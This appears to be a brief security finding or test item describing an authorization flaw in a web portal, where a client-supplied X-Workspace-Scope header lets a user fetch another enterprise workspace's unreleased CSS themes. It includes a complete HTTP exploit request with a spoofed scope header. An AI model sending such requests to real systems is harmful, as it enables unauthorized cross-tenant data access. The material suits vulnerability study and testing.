diagnosis: The front-end proxy controller relays client-supplied X-Workspace-Scope headers into downstream Feign client calls without checking workspace membership. Users can retrieve unreleased corporate branding stylesheets and CSS themes belonging to other enterprise workspaces.
exploit_request:
GET /api/ui/theme-bundle HTTP/1.1
Host: portal.enterpriseweb.io
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJtZW1iZXJfMDEiLCJhdXRob3JpemVkV3MiOiJXUy1TVEFOREFSRCJ9.sig
X-Workspace-Scope: WS-ENTERPRISE-UNRELEASED
Accept: text/css
